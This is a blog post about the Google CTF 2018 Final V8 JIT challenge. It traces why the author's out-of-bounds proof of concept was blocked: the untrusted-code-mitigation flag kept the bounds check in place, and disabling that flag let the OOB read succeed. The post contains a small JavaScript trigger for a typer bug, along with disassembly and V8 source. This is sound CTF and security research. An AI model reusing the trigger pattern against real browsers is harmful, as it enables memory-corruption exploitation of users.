---
layout: post
title:  "Why I failed to trigger Bound Check Elimination in Google CTF 2018 Final JIT"
date:   2019-08-09 00:00:00 +0000
categories: jekyll update
---

## 0x00 Overview

When I was trying JIT challenge in Google CTF 2018 Final by reading [this article](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#the-duplicateadditionreducer-challenge), I failed to trigger the OOB vulnerability. After some investigation, I found that it is a compilation flag that causes the bound elimination to be disabled.

Note: This article is not a complete writeup for this challenge, but a piece of record about my investigation as to why the OOB is not triggered. As for the writeup, read that article I linked above. :)

## 0x01 PoC Failure

After understanding the vulnerability, I have written my own PoC.

```javascript
function f(x)
{
	const arr = new Array(1.1, 2.2, 3.3, 4.4, 5.5);
	let t = (x == 1 ? 9007199254740992 : 9007199254740989) + 1 + 1;
	t -= 9007199254740989; // t can be 5, but expect <= 3
	return arr[t];
}

console.log(f(1));

%OptimizeFunctionOnNextCall(f);
console.log(f(1));
```

However, no matter how I mutate the PoC, the OOB can never be triggered, unless the code is mutated in a way that will not cause the OOB to be triggered.

```javascript
function f(x)
{
	const arr = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
	let t = (x == 1 ? 9007199254740992 : 9007199254740989) + 1 + 1;
	t -= 9007199254740989; // t can be 5, but expect <= 3
	return arr[t];
}

console.log(f(1));
%OptimizeFunctionOnNextCall(f);
console.log(f(1));
// output:
// 4.4
// 6.6
```

The only difference is that number of elements in array is 6 instead of 5 now, so the OOB will not be triggered. Here `6.6` will be printed which means optimization is indeed triggered. No matter how I try it, as long as there is an OOB access, the optimization will fail to be triggered.

However, by reading JIT compiled code, optimization is indeed there.

```assembly
115  REX.W cmpq rcx,rdx ; comparison that represents `?:` operator
118  jz 0x29493ee92  <+0x132>
11e  REX.W movq r10,0x433ffffffffffffd ; 9.007199254740989E15
128  vmovq xmm1,r10
12d  jmp 0x29493eea1  <+0x141>
132  REX.W movq r10,0x4340000000000000 ; 9.007199254740992E15
13c  vmovq xmm1,r10
141  vpcmpeqd xmm2,xmm2,xmm2 ; xmm2 = 0xffffffffffffffffffffffffffffffff
145  vpsllq xmm2,xmm2,63
14a  vpsrlq xmm2,xmm2,1 ; xmm2 = 0x40000000000000004000000000000000
14f  vaddsd xmm1,xmm1,xmm2 ; xmm1 += 2.0, not 1.0 + 1.0 here!
```

Then I tried to debug this piece of code to see what is happening. Initially I tried to set the breakpoint at JIT complied function like this.

```javascript
console.log(f(1));
%OptimizeFunctionOnNextCall(f);
console.log(f(1));
%DebugPrint(f); // here we can get address of JIT code
readline(); // ctrl+c and set breakpoint at JIT code
console.log(f(1)); // trigger the breakpoint
```

However, after several stepping, deoptimization is triggered and JIT code is not executed.

```assembly
24  REX.W movq rbx,[rcx-0x20]
28  testb [rbx+0xf],0x1
2c  jnz 0x2948946e0  (CompileLazyDeoptimizedCode) ; code: Builtin::CompileLazyDeoptimizedCode
```

The `rbx` seems to be a `CodeDataContainer`. Here the byte that is tested is `kind_specific_flags` which is 7, whose lowest bit is 1, causing the `jnz` to be jumped.

```
gef➤  job $rbx
0x1bdcdafa1061: [CodeDataContainer] in OldSpace
 - map: 0x1c3730f81411 <Map[24]>
 - kind_specific_flags: 7
```

However, as long as the OOB is not triggered, the `kind_specific_flags` at this point will be 4, which allows the JIT code to be executed.

Then I tried to use `--trace-deopt` flag to see the deoptimization, and what I found is that even before reaching here, the deoptimization, which is caused by OOB as it suggests, has already been triggered once. Then I realized this is already the second time that this JIT code is called, because `%OptimizeFunctionOnNextCall` will optimize and call the generated JIT code in this next call. So I need to pause at the first call to see why OOB is still detected.

My approach to pause at the first call is to set a breakpoint at function `PipelineImpl::CommitDependencies`, and set a breakpoint at JIT code by inspecting its `Handle<Code>` argument, so that we can pause at the first time when JIT code is called.

At the first call `kind_specific_flags` is indeed 4, and code `xmm1 += 2.0` is indeed executed, but after some stepping, I found this:

```assembly
153  REX.W movq r10,[rip+0xffffffc6] ; 0x15a-58=0x120, which is 9.007199254740989E15
15a  vmovq xmm0,r10
15f  vsubsd xmm0,xmm1,xmm0 ; t -= 9007199254740989
163  vcvttsd2si rcx,xmm0 ; convert to long
167  movl rsi,rcx
169  REX.W movq r10,[rip+0xffffff9d]
170  REX.W cmpq r10,rsi ; must < 0x100000000
173  jnc 0x29493eee7  <+0x187>
; ...
187  cmpl rcx,0x4 ; bound check and deoptimize if OOB!
18a  jnc 0x29493efd5  <+0x275> ; 0x275 is depotimization call
```

It seems that the OOB check is still here and it will deoptimize if there is any OOB, so that the deoptimized code will be execute instead from scratch, which perfectly explain why it produce `4.4` instead of value like `undefined`.

## 0x02 Reason for Existence of Bound Check

Then I would like to investigate why bound check is still here. Since in `simplified lowering` phase, type information should already be enough for reducer to eliminate the check.

![1565317430628](/images/1565317430628.png)

In order to find where it goes wrong, I started to read source code of `simplified lowering` phase, and found the codes that may correspond to bound check elimination:

```c++
case IrOpcode::kCheckBounds: {
  const CheckParameters& p = CheckParametersOf(node->op());
  Type index_type = TypeOf(node->InputAt(0));
  Type length_type = TypeOf(node->InputAt(1));
  if (index_type.Is(Type::Integral32OrMinusZero())) {
    // Map -0 to 0, and the values in the [-2^31,-1] range to the
    // [2^31,2^32-1] range, which will be considered out-of-bounds
    // as well, because the {length_type} is limited to Unsigned31.
    VisitBinop(node, UseInfo::TruncatingWord32(),
               MachineRepresentation::kWord32);
    if (lower() && lowering->poisoning_level_ ==
                       PoisoningMitigationLevel::kDontPoison) {
      if (index_type.IsNone() || length_type.IsNone() ||
          (index_type.Min() >= 0.0 &&
           index_type.Max() < length_type.Min())) {
        // The bounds check is redundant if we already know that
        // the index is within the bounds of [0.0, length[.
        DeferReplacement(node, node->InputAt(0));
      }
    }
  } else {
    VisitBinop(
        node,
        UseInfo::CheckedSigned32AsWord32(kIdentifyZeros, p.feedback()),
        UseInfo::TruncatingWord32(), MachineRepresentation::kWord32);
  }
  return;
}
```

By reading codes and comments, I guess by executing `DeferReplacement` the bound check would be eliminated, so I set a breakpoint here to see what happens. The breakpoint is triggered 3 times, for the first 2 times, `lower()` function returns `false` which suggests it is still not `lowering phase` yet (`phase_ == LOWER` gives `false`). For the last time, `lower()` gives `true` but `lowering->poisoning_level_ == PoisoningMitigationLevel::kDontPoison` does not hold. Then I tried to find where such `poisoning_level_ ` comes from. 

`lowering` is type `SimplifiedLowering*`, and `poisoning_level_` is passed through constructor as shown:

```c++
SimplifiedLowering::SimplifiedLowering( // ...
                                       PoisoningMitigationLevel poisoning_level)
    : // ...
      poisoning_level_(poisoning_level) {}
```

`lowering` is actually the instance created in `SimplifiedLoweringPhase::Run`, so `poison_level` comes from `data->info()->GetPoisoningMitigationLevel()`.

```c++
struct SimplifiedLoweringPhase {
  static const char* phase_name() { return "simplified lowering"; }

  void Run(PipelineData* data, Zone* temp_zone) {
    SimplifiedLowering lowering(data->jsgraph(), data->js_heap_broker(),
                                temp_zone, data->source_positions(),
                                data->node_origins(),
                                data->info()->GetPoisoningMitigationLevel());
    lowering.LowerAllNodes();
  }
};
```

`data->info()` is type `OptimizedCompilationInfo*`, and 2 methods are defined.

```c++
void SetPoisoningMitigationLevel(PoisoningMitigationLevel poisoning_level) {
  poisoning_level_ = poisoning_level;
}
PoisoningMitigationLevel GetPoisoningMitigationLevel() const {
  return poisoning_level_;
}
// definition of field poisoning_level_
PoisoningMitigationLevel poisoning_level_ =
    PoisoningMitigationLevel::kDontPoison; // default init
```

So it must be `SetPoisoningMitigationLevel` that is used to change to value of `poisoning_level_` to `kPoisonCriticalOnly`. There are only 2 references of this function, one of which seems to be more interesting:

```c++
// in PipelineCompilationJob::PrepareJobImpl
// This is the bottleneck for computing and setting poisoning level in the
// optimizing compiler.
PoisoningMitigationLevel load_poisoning =
    PoisoningMitigationLevel::kDontPoison;
if (FLAG_untrusted_code_mitigations) {
  // For full mitigations, this can be changed to
  // PoisoningMitigationLevel::kPoisonAll.
  load_poisoning = PoisoningMitigationLevel::kPoisonCriticalOnly;
}
compilation_info()->SetPoisoningMitigationLevel(load_poisoning);
```

By debugging, I found `FLAG_untrusted_code_mitigations` is indeed `true`. This flag is defined here:

```c++
#ifdef DISABLE_UNTRUSTED_CODE_MITIGATIONS
#define V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS false
#else
#define V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS true
#endif
DEFINE_BOOL(untrusted_code_mitigations, V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS,
            "Enable mitigations for executing untrusted code")
#undef V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS
```

Therefore, finally it seems that it is a compilation macro that causes the OOB to fail! Then after I changed the codes to make `FLAG_untrusted_code_mitigations` always `false` and recompiled the `d8`, the OOB can be triggered successfully!

```
4.4
-1.1885946300594787e+148
```

## 0x03 Summary

Due to undefinition of a macro, `FLAG_untrusted_code_mitigations` is `true`, making `poisoning_level_` in `OptimizedCompilationInfo` to be `PoisoningMitigationLevel::kPoisonCriticalOnly`, which is passed into `SimplifiedLowering` instance and resists bound check elimination to be done.

I am not sure why this macro is not set by default, and this should have been set, since it seems that in release version of v8 bound check elimination feature exists, otherwise all kinds of relative exploitations cannot work at all! If anyone knows the reason, I will be glad if you can share this with me. :)